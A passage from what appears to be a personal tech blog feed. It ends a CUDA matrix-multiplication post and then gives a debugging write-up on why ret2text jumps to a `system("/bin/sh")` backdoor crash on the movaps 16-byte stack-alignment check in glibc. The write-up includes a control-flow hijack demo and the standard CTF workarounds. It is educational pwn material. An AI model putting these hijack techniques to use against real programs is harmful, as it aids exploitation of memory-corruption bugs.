        <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="sc">' '</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">endl</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">__device__</span> <span class="kt">float</span> <span class="nf">GPUMulAtom</span><span class="p">(</span><span class="kt">float</span> <span class="n">a</span><span class="p">,</span> <span class="kt">float</span> <span class="n">b</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">a</span> <span class="o">*</span> <span class="n">b</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">__global__</span> <span class="kt">void</span> <span class="nf">GPUMul</span><span class="p">(</span><span class="kt">float</span> <span class="o">**</span><span class="n">A</span><span class="p">,</span> <span class="kt">float</span> <span class="o">**</span><span class="n">B</span><span class="p">,</span> <span class="kt">float</span> <span class="o">**</span><span class="n">C</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">row</span> <span class="o">=</span> <span class="n">blockIdx</span><span class="p">.</span><span class="n">x</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">col</span> <span class="o">=</span> <span class="n">threadIdx</span><span class="p">.</span><span class="n">x</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">range</span> <span class="o">=</span> <span class="n">threadIdx</span><span class="p">.</span><span class="n">y</span><span class="p">;</span>
    <span class="n">C</span><span class="p">[</span><span class="n">row</span><span class="p">][</span><span class="n">col</span><span class="p">]</span> <span class="o">=</span> <span class="n">GPUMulAtom</span><span class="p">(</span><span class="n">A</span><span class="p">[</span><span class="n">row</span><span class="p">][</span><span class="n">range</span><span class="p">],</span> <span class="n">B</span><span class="p">[</span><span class="n">range</span><span class="p">][</span><span class="n">col</span><span class="p">]);</span>
<span class="p">}</span>
<span class="n">__global__</span> <span class="kt">void</span> <span class="nf">GPUCheck</span><span class="p">(</span><span class="kt">float</span> <span class="o">**</span><span class="n">matrix</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%f "</span><span class="p">,</span> <span class="n">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">randomMatrix</span><span class="p">(</span><span class="n">Matrix_CPU_A</span><span class="p">);</span>
    <span class="n">randomMatrix</span><span class="p">(</span><span class="n">Matrix_CPU_B</span><span class="p">);</span>
    <span class="kt">float</span> <span class="o">**</span><span class="n">Matrix_GPU_A</span><span class="p">,</span><span class="o">**</span><span class="n">Matrix_GPU_B</span><span class="p">,</span><span class="o">**</span><span class="n">Matrix_GPU_C</span><span class="p">;</span>

    <span class="n">cudaMalloc</span><span class="p">((</span><span class="kt">float</span><span class="o">***</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Matrix_GPU_A</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span> <span class="o">*</span> <span class="n">N</span> <span class="p">);</span>
    <span class="n">cudaMalloc</span><span class="p">((</span><span class="kt">float</span><span class="o">***</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Matrix_GPU_B</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span> <span class="o">*</span> <span class="n">N</span> <span class="p">);</span>
    <span class="n">cudaMalloc</span><span class="p">((</span><span class="kt">float</span><span class="o">***</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Matrix_GPU_C</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span> <span class="o">*</span> <span class="n">N</span> <span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">Matrix_GPU_A</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">Matrix_GPU_B</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">Matrix_GPU_C</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">cudaMemset</span><span class="p">(</span><span class="n">Matrix_GPU_A</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span> <span class="o">*</span> <span class="n">N</span><span class="p">);</span>
        <span class="n">cudaMemset</span><span class="p">(</span><span class="n">Matrix_GPU_B</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span> <span class="o">*</span> <span class="n">N</span><span class="p">);</span>
        <span class="n">cudaMemset</span><span class="p">(</span><span class="n">Matrix_GPU_C</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span> <span class="o">*</span> <span class="n">N</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">cudaFree</span><span class="p">(</span><span class="n">Matrix_GPU_A</span><span class="p">);</span>
        <span class="n">cudaFree</span><span class="p">(</span><span class="n">Matrix_GPU_B</span><span class="p">);</span>
        <span class="n">cudaFree</span><span class="p">(</span><span class="n">Matrix_GPU_C</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"cudaMalloc failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">cudaMemcpy</span><span class="p">(</span><span class="n">Matrix_CPU_A</span><span class="p">,</span><span class="n">Matrix_GPU_A</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span><span class="o">*</span> <span class="n">N</span><span class="p">,</span><span class="n">cudaMemcpyHostToDevice</span><span class="p">);</span>
    <span class="n">cudaMemcpy</span><span class="p">(</span><span class="n">Matrix_CPU_B</span><span class="p">,</span><span class="n">Matrix_GPU_B</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span><span class="o">*</span> <span class="n">N</span><span class="p">,</span><span class="n">cudaMemcpyHostToDevice</span><span class="p">);</span>
    <span class="n">cudaMemcpy</span><span class="p">(</span><span class="n">Matrix_CPU_C</span><span class="p">,</span><span class="n">Matrix_GPU_C</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span><span class="o">*</span> <span class="n">N</span><span class="p">,</span><span class="n">cudaMemcpyHostToDevice</span><span class="p">);</span>

    <span class="kt">clock_t</span> <span class="n">CPU_begin</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">CPUMul</span><span class="p">();</span>
    <span class="kt">clock_t</span> <span class="n">CPU_end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="c1">// check(Matrix_CPU_C);</span>
    <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"CPU: "</span><span class="o">&lt;&lt;</span><span class="n">CPU_end</span> <span class="o">-</span> <span class="n">CPU_begin</span><span class="o">&lt;&lt;</span><span class="s">" ms"</span><span class="o">&lt;&lt;</span><span class="n">endl</span><span class="p">;</span>

    <span class="n">dim3</span> <span class="n">block</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="n">N</span><span class="p">);</span>
    <span class="n">dim3</span> <span class="n">grid</span><span class="p">(</span><span class="n">N</span><span class="p">);</span>
    <span class="kt">clock_t</span> <span class="n">GPU_begin</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">GPUMul</span><span class="o">&lt;&lt;&lt;</span><span class="n">grid</span><span class="p">,</span> <span class="n">block</span><span class="o">&gt;&gt;&gt;</span><span class="p">(</span><span class="n">Matrix_GPU_A</span><span class="p">,</span> <span class="n">Matrix_GPU_B</span><span class="p">,</span> <span class="n">Matrix_GPU_C</span><span class="p">);</span>
    <span class="n">cudaDeviceSynchronize</span><span class="p">();</span>
    <span class="kt">clock_t</span> <span class="n">GPU_end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="c1">// GPUCheck(Matrix_GPU_C);</span>
    <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"GPU: "</span><span class="o">&lt;&lt;</span><span class="n">GPU_end</span> <span class="o">-</span> <span class="n">GPU_begin</span><span class="o">&lt;&lt;</span><span class="s">" ms"</span><span class="o">&lt;&lt;</span><span class="n">endl</span><span class="p">;</span>

    <span class="n">cudaFree</span><span class="p">(</span><span class="n">Matrix_GPU_A</span><span class="p">);</span>
    <span class="n">cudaFree</span><span class="p">(</span><span class="n">Matrix_GPU_B</span><span class="p">);</span>
    <span class="n">cudaFree</span><span class="p">(</span><span class="n">Matrix_GPU_C</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># const int N = 1024;</span>
CPU: 6607223 ms
GPU: 8970 ms
<span class="c"># const int N = 2048;</span>
CPU: 182436212 ms
GPU: 22204 ms
</code></pre></div></div> <h5 id="需要注意的是由于cpu和gpu是不同的部件两者之间需要通过pcie总线通信这个过程会消耗比较多的时间相较于单步计算而言所以在计算量比较小的时候gpu并行相较于cpu串行不会有太好的效果">   需要注意的是，由于CPU和GPU是不同的部件，两者之间需要通过PCIe总线通信，这个过程会消耗比较多的时间(相较于单步计算而言)，所以在计算量比较小的时候，GPU并行相较于CPU串行不会有太好的效果.</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># const int N = 64;</span>
CPU: 1178 ms
GPU: 5040 ms
</code></pre></div></div>]]></content><author><name>久菜合子</name></author><category term="dev"/><summary type="html"><![CDATA[ps: 课题来自于泥卓的课后作业 ps: 建议把页面markdown自己放到vscode或者typora上, 因为本站的markdown似乎没有办法显示Latex语法]]></summary></entry><entry><title type="html">XEE寄存器和16字节栈对齐.</title><link href="https://leakbox258.github.io/blog/2024/XEE%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C16%E5%AD%97%E8%8A%82%E6%A0%88%E5%AF%B9%E9%BD%90/" rel="alternate" type="text/html" title="XEE寄存器和16字节栈对齐."/><published>2024-10-28T00:00:00+00:00</published><updated>2024-10-28T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2024/XEE%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C16%E5%AD%97%E8%8A%82%E6%A0%88%E5%AF%B9%E9%BD%90</id><content type="html" xml:base="https://leakbox258.github.io/blog/2024/XEE%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C16%E5%AD%97%E8%8A%82%E6%A0%88%E5%AF%B9%E9%BD%90/"><![CDATA[ <h3 id="引子-demo0和demo1的对比">引子—-demo0和demo1的对比</h3> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// demo0</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">getshell</span><span class="p">(){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">getshell</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="demo0直接在main中调用后门函数一切正常">   demo0，直接在main()中调用后门函数，一切正常</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// demo1</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">getshell</span><span class="p">(){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">array</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
    <span class="n">array</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">getshell</span><span class="p">;</span> <span class="c1">// 数组越界</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="demo1-用数组越界来模拟pwn中的劫持控制流">   demo1, 用数组越界来模拟pwn中的劫持控制流。<br/></h5> <h5 id="然后理所当然地寄了就和pwn中直接返回到backdoor中一样">   然后理所当然地寄了，就和pwn中直接返回到backdoor中一样。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./test 
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</code></pre></div></div> <h5 id="一般这种情况有两种方法解决一种在ropchain中加一个ret指令一种直接劫持到system语句的位置跳过push-rbp">   一般这种情况，有两种方法解决，一种在ROPchain中加一个ret指令，一种直接劫持到<code class="language-plaintext highlighter-rouge">system()</code>语句的位置，跳过<code class="language-plaintext highlighter-rouge">push rbp</code><br/></h5> <h5 id="事实上并不是所有这种ret2text都需要这种技巧这和栈所在的环境有关不同的程序甚至于不同的机器之间栈都有细微的差别">   事实上并不是所有这种ret2text都需要这种技巧，这和栈所在的环境有关，不同的程序甚至于不同的机器之间栈都有细微的差别<br/></h5> <h3 id="如何检查16位栈对齐">如何检查16位栈对齐</h3> <h5 id="现在来探索一下system是如何检查栈不平衡的-利用上面的demo1动态调试">   现在来探索一下<code class="language-plaintext highlighter-rouge">system()</code>是如何检查栈不平衡的<br/>    利用上面的demo1动态调试</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x7ffff7dd3d70 &lt;system&gt;          endbr64 
 ► 0x7ffff7dd3d74 &lt;system+4&gt;        <span class="nb">test   </span>rdi, rdi     0x555555556004 &amp; 0x555555556004     EFLAGS <span class="o">=&gt;</span> 0x202 <span class="o">[</span> cf pf af zf sf IF <span class="nb">df </span>of <span class="o">]</span>
   0x7ffff7dd3d77 &lt;system+7&gt;        je     system+16                   &lt;system+16&gt;
 
   0x7ffff7dd3d79 &lt;system+9&gt;        jmp    do_system                   &lt;do_system&gt;
    ↓
   0x7ffff7dd3900 &lt;do_system&gt;       push   r15
   0x7ffff7dd3902 &lt;do_system+2&gt;     mov    edx, 1                    EDX <span class="o">=&gt;</span> 1
   0x7ffff7dd3907 &lt;do_system+7&gt;     push   r14
   0x7ffff7dd3909 &lt;do_system+9&gt;     lea    r14, <span class="o">[</span>rip + 0x1cbf30]     R14 <span class="o">=&gt;</span> 0x7ffff7f9f840 <span class="o">(</span>intr<span class="o">)</span> ◂— 0
   0x7ffff7dd3910 &lt;do_system+16&gt;    push   r13
   0x7ffff7dd3912 &lt;do_system+18&gt;    lea    r13, <span class="o">[</span>rip + 0x1cbe87]     R13 <span class="o">=&gt;</span> 0x7ffff7f9f7a0 <span class="o">(</span>quit<span class="o">)</span> ◂— 0
   0x7ffff7dd3919 &lt;do_system+25&gt;    movq   xmm2, r14                 XMM2 <span class="o">=&gt;</span> 0x7ffff7f9f840 <span class="o">(</span>intr<span class="o">)</span> ◂— 0
</code></pre></div></div> <h5 id="在systemplt处stepin-可以看到单纯地进入system完全没有问题">   在<code class="language-plaintext highlighter-rouge">system@plt</code>处stepin, 可以看到单纯地进入<code class="language-plaintext highlighter-rouge">system</code>完全没有问题。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x7ffff7dd3d79 &lt;system+9&gt;        jmp    do_system                   &lt;do_system&gt;
    ↓
 ► 0x7ffff7dd3900 &lt;do_system&gt;       push   r15
   0x7ffff7dd3902 &lt;do_system+2&gt;     mov    edx, 1                    EDX <span class="o">=&gt;</span> 1
   0x7ffff7dd3907 &lt;do_system+7&gt;     push   r14
   0x7ffff7dd3909 &lt;do_system+9&gt;     lea    r14, <span class="o">[</span>rip + 0x1cbf30]     R14 <span class="o">=&gt;</span> 0x7ffff7f9f840 <span class="o">(</span>intr<span class="o">)</span> ◂— 0
   0x7ffff7dd3910 &lt;do_system+16&gt;    push   r13
   0x7ffff7dd3912 &lt;do_system+18&gt;    lea    r13, <span class="o">[</span>rip + 0x1cbe87]     R13 <span class="o">=&gt;</span> 0x7ffff7f9f7a0 <span class="o">(</span>quit<span class="o">)</span> ◂— 0
   0x7ffff7dd3919 &lt;do_system+25&gt;    movq   xmm2, r14                 XMM2 <span class="o">=&gt;</span> 0x7ffff7f9f840 <span class="o">(</span>intr<span class="o">)</span> ◂— 0
</code></pre></div></div> <h5 id="然后跳转到do_system">   然后跳转到<code class="language-plaintext highlighter-rouge">do_system</code></h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ► 0x7ffff7dd3967 &lt;do_system+103&gt;    mov    qword ptr <span class="o">[</span>rsp + 0x188], 0                <span class="o">[</span>0x7fffffffd8c0] <span class="o">=&gt;</span> 0
   0x7ffff7dd3973 &lt;do_system+115&gt;    movaps xmmword ptr <span class="o">[</span>rsp], xmm1                   &lt;<span class="o">[</span>0x7fffffffd738] not aligned to 16 bytes&gt;
   0x7ffff7dd3977 &lt;do_system+119&gt;    lock cmpxchg dword ptr <span class="o">[</span>rip + 0x1cbe01], edx
   0x7ffff7dd397f &lt;do_system+127&gt;    jne    do_system+816               &lt;do_system+816&gt;
 
   0x7ffff7dd3985 &lt;do_system+133&gt;    mov    eax, dword ptr <span class="o">[</span>rip + 0x1cbdf9]           EAX, <span class="o">[</span>sa_refcntr] <span class="o">=&gt;</span> 0
   0x7ffff7dd398b &lt;do_system+139&gt;    lea    edx, <span class="o">[</span>rax + 1]                            EDX <span class="o">=&gt;</span> 1
   0x7ffff7dd398e &lt;do_system+142&gt;    mov    dword ptr <span class="o">[</span>rip + 0x1cbdf0], edx           <span class="o">[</span>sa_refcntr] <span class="o">=&gt;</span> 1
   0x7ffff7dd3994 &lt;do_system+148&gt;    <span class="nb">test   </span>eax, eax                                  0 &amp; 0     EFLAGS <span class="o">=&gt;</span> 0x246 <span class="o">[</span> cf PF af ZF sf IF <span class="nb">df </span>of <span class="o">]</span>
   0x7ffff7dd3996 &lt;do_system+150&gt;  ✔ je     do_system+536               &lt;do_system+536&gt;
    ↓
   0x7ffff7dd3b18 &lt;do_system+536&gt;    lea    rbp, <span class="o">[</span>rsp + 0x180]                  RBP <span class="o">=&gt;</span> 0x7fffffffd8b8 ◂— 1
   0x7ffff7dd3b20 &lt;do_system+544&gt;    mov    rdx, r14                            RDX <span class="o">=&gt;</span> 0x7ffff7f9f840 <span class="o">(</span>intr<span class="o">)</span> ◂— 0
</code></pre></div></div> <h5 id="结果单步一下直接给我干到了do_system103的位置就是检查到没有16位对齐的上一句之前调试kernel的时候也有类似的问题">   结果单步一下直接给我干到了<code class="language-plaintext highlighter-rouge">do_system+103</code>的位置，就是检查到没有16位对齐的上一句，之前调试kernel的时候也有类似的问题<br/></h5> <h5 id="检查先放一下看一下do_system汇编免得漏掉什么">   检查先放一下，看一下<code class="language-plaintext highlighter-rouge">do_system</code>汇编，免得漏掉什么</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x7ffff7dd3900 &lt;do_system&gt;:  push   r15
   0x7ffff7dd3902 &lt;do_system+2&gt;:        mov    edx,0x1
   0x7ffff7dd3907 &lt;do_system+7&gt;:        push   r14
   0x7ffff7dd3909 &lt;do_system+9&gt;:        lea    r14,[rip+0x1cbf30]        <span class="c"># 0x7ffff7f9f840 &lt;intr&gt;</span>
   0x7ffff7dd3910 &lt;do_system+16&gt;:       push   r13
   0x7ffff7dd3912 &lt;do_system+18&gt;:       lea    r13,[rip+0x1cbe87]        <span class="c"># 0x7ffff7f9f7a0 &lt;quit&gt;</span>
   0x7ffff7dd3919 &lt;do_system+25&gt;:       movq   xmm2,r14
   0x7ffff7dd391e &lt;do_system+30&gt;:       push   r12
   0x7ffff7dd3920 &lt;do_system+32&gt;:       movq   xmm1,r13
   0x7ffff7dd3925 &lt;do_system+37&gt;:       push   rbp
   0x7ffff7dd3926 &lt;do_system+38&gt;:       punpcklqdq xmm1,xmm2
   0x7ffff7dd392a &lt;do_system+42&gt;:       push   rbx
   0x7ffff7dd392b &lt;do_system+43&gt;:       mov    rbx,rdi
   0x7ffff7dd392e &lt;do_system+46&gt;:       sub    rsp,0x388
   0x7ffff7dd3935 &lt;do_system+53&gt;:       mov    rax,QWORD PTR fs:0x28
   0x7ffff7dd393e &lt;do_system+62&gt;:       mov    QWORD PTR <span class="o">[</span>rsp+0x378],rax
   0x7ffff7dd3946 &lt;do_system+70&gt;:       xor    eax,eax
   0x7ffff7dd3948 &lt;do_system+72&gt;:       mov    DWORD PTR <span class="o">[</span>rsp+0x18],0xffffffff
   0x7ffff7dd3950 &lt;do_system+80&gt;:       mov    QWORD PTR <span class="o">[</span>rsp+0x180],0x1
   0x7ffff7dd395c &lt;do_system+92&gt;:       mov    DWORD PTR <span class="o">[</span>rsp+0x208],0x0
<span class="o">=&gt;</span> 0x7ffff7dd3967 &lt;do_system+103&gt;:      mov    QWORD PTR <span class="o">[</span>rsp+0x188],0x0  <span class="c"># 执行到这里了</span>
   0x7ffff7dd3973 &lt;do_system+115&gt;:      movaps XMMWORD PTR <span class="o">[</span>rsp],xmm1
</code></pre></div></div> <h5 id="可以看到没有跳转就单纯是一路执行下来的关注一下两个xmm寄存器">   可以看到没有跳转，就单纯是一路执行下来的，关注一下两个xmm寄存器<br/></h5> <p>参考：https://cch123.gitbooks.io/duplicate/content/part3/translation-details/function-calling-sequence/xmm-registers.html</p> <h5 id="ssestreaming-simd-extensions是针对当前cpu寄存器以及指令集的一个拓展有xmm0--xmm1516个128bit的寄存器xmm寄存器主要干两件事第一个是浮点运算第二个是simd指令集一条指令操作多条数据对于xmm寄存器有几种方法控制其中的数据第一种movq指令q表示_qword既64bit该指令会操作xmm寄存器的低64bit而无需检查另一个操作数可以是xmm寄存器或者一个64bit寄存器第二种movdqa和movdqu表示double-_qworda代表alignedu代表unaligned用于将内存中的128bit数据或者某个xmm的数据转存到另一个xmm中很明显aligned代表在操作数为内存时需要16位对齐第三种movups和movapsu和a的含义不变而ps表示packed-single-precision-floating-point打包的单精度浮点数一个float有32bit而128bit就是4个float这就是simd的多条数据的含义第四种movupd和movapd几乎和第三种一样d可能表示data">   SSE(Streaming SIMD Extensions)是针对当前CPU寄存器以及指令集的一个拓展，有<code class="language-plaintext highlighter-rouge">xmm0 ~ xmm15</code>16个128bit的寄存器，xmm寄存器主要干两件事，第一个是浮点运算，第二个是SIMD指令集，一条指令操作多条数据。<br/>   对于xmm寄存器，有几种方法控制其中的数据，第一种<code class="language-plaintext highlighter-rouge">movq</code>指令，q表示_QWORD，既64bit，该指令会操作xmm寄存器的低64bit而无需检查，另一个操作数可以是xmm寄存器或者一个64bit寄存器；<br/>   第二种，movdqa和movdqu，表示Double _QWORD，a代表aligned，u代表unaligned，用于将内存中的128bit数据或者某个xmm的数据，转存到另一个xmm中，很明显aligned代表在操作数为内存时需要16位对齐<br/>   第三种，movups和movaps，u和a的含义不变，而ps表示packed single-precision floating-point(打包的单精度浮点数)，一个float有32bit，而128bit就是4个float，这就是SIMD的多条数据的含义。<br/>   第四种，movupd和movapd，几乎和第三种一样，d可能表示data<br/></h5> <h5 id="然后回到do_system103这里涉及sse为什么需要16位字节对齐首先显而易见地因为xmm是16字节所以对xmm寄存器的读取和别的数据一样要按数据类型大小对齐但是这实际上不能解释为什么存在不对齐的指令可能是指令做了一些拼接操作除了之前movq可以操作xmm的低64位之外一些像movhlpspunpckhqdq的指令可以操作xmm寄存器的高64位">   然后回到<code class="language-plaintext highlighter-rouge">do_system+103</code>，这里涉及SSE为什么需要16位字节对齐，首先显而易见地因为xmm是16字节，所以对xmm寄存器的读取和别的数据一样要按数据类型大小对齐，<br/>   但是这实际上不能解释为什么存在不对齐的指令，可能是指令做了一些拼接操作?除了之前movq可以操作xmm的低64位之外，一些像movhlps、punpckhqdq的指令可以操作xmm寄存器的高64位<br/></h5> <h5 id="做个总结涉及sse中特定指令比如movapsmovdqa需要当前内存类型操作数16位对齐反映在do_system中rsp指向位置需要16位对齐也就是栈需要16位对齐">   做个总结，涉及SSE中特定指令，比如movaps、movdqa需要当前内存类型操作数16位对齐，反映在<code class="language-plaintext highlighter-rouge">do_system</code>中，rsp指向位置需要16位对齐，也就是栈需要16位对齐。<br/></h5> <h3 id="为什么用xmm">为什么用xmm</h3> <h5 id="程序为什么要有这一步xmm到rsp的赋值操作先用print-xmm1看一下xmm1有什么">   程序为什么要有这一步xmm到<code class="language-plaintext highlighter-rouge">[rsp]</code>的赋值操作，先用<code class="language-plaintext highlighter-rouge">print $xmm1</code>看一下xmm1有什么</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; print <span class="nv">$xmm1</span>
<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>
  v8_bfloat16 <span class="o">=</span> <span class="o">{</span><span class="nt">-6</span>.49e+33, <span class="nt">-1</span>.01e+34, nan<span class="o">(</span>0x7f<span class="o">)</span>, 0, <span class="nt">-1</span>.558e+34, <span class="nt">-1</span>.01e+34, nan<span class="o">(</span>0x7f<span class="o">)</span>, 0<span class="o">}</span>,
  v8_half <span class="o">=</span> <span class="o">{</span><span class="nt">-31232</span>, <span class="nt">-32656</span>, nan<span class="o">(</span>0x3ff<span class="o">)</span>, 0, <span class="nt">-34816</span>, <span class="nt">-32656</span>, nan<span class="o">(</span>0x3ff<span class="o">)</span>, 0<span class="o">}</span>,
  v4_float <span class="o">=</span> <span class="o">{</span><span class="nt">-1</span>.01398777e+34, 4.59163468e-41, <span class="nt">-1</span>.01399768e+34, 4.59163468e-41<span class="o">}</span>,
  v2_double <span class="o">=</span> <span class="o">{</span>6.9533491570647782e-310, 6.9533491570726832e-310<span class="o">}</span>,
  v16_int8 <span class="o">=</span> <span class="o">{</span><span class="nt">-96</span>, <span class="nt">-9</span>, <span class="nt">-7</span>, <span class="nt">-9</span>, <span class="nt">-1</span>, 127, 0, 0, 64, <span class="nt">-8</span>, <span class="nt">-7</span>, <span class="nt">-9</span>, <span class="nt">-1</span>, 127, 0, 0<span class="o">}</span>,
  v8_int16 <span class="o">=</span> <span class="o">{</span><span class="nt">-2144</span>, <span class="nt">-2055</span>, 32767, 0, <span class="nt">-1984</span>, <span class="nt">-2055</span>, 32767, 0<span class="o">}</span>,
  v4_int32 <span class="o">=</span> <span class="o">{</span><span class="nt">-134613088</span>, 32767, <span class="nt">-134612928</span>, 32767<span class="o">}</span>,
  v2_int64 <span class="o">=</span> <span class="o">{</span>140737353742240, 140737353742400<span class="o">}</span>,
  uint128 <span class="o">=</span> 2596145946097181985715420921460640
<span class="o">}</span>
</code></pre></div></div> <h5 id="关注v2_int64的两个值0x7ffff7f9f7a0quit和0x7ffff7f9f840intr-这两个值在前面通过r13和r14寄存器放到了xmm1中在下面有对这两个值的使用以一种类似硬编码的方式使用">   关注<code class="language-plaintext highlighter-rouge">v2_int64</code>的两个值，0x7ffff7f9f7a0&lt;quit&gt;和0x7ffff7f9f840&lt;intr&gt; ,这两个值在前面通过r13和r14寄存器放到了xmm1中<br/>   在下面有对这两个值的使用，以一种类似硬编码的方式使用<br/></h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x7ffff7dd39d3 &lt;do_system+211&gt;:      xor    eax,eax
   0x7ffff7dd39d5 &lt;do_system+213&gt;:      cmp    QWORD PTR <span class="o">[</span>rip+0x1cbe63],0x1        <span class="c"># 0x7ffff7f9f840 &lt;intr&gt;</span>
   0x7ffff7dd39dd &lt;do_system+221&gt;:      setne  al
   0x7ffff7dd39e0 &lt;do_system+224&gt;:      add    rax,rax
   0x7ffff7dd39e3 &lt;do_system+227&gt;:      cmp    QWORD PTR <span class="o">[</span>rip+0x1cbdb5],0x1        <span class="c"># 0x7ffff7f9f7a0 &lt;quit&gt;</span>
   0x7ffff7dd39eb &lt;do_system+235&gt;:      mov    QWORD PTR <span class="o">[</span>rsp+0x100],rax
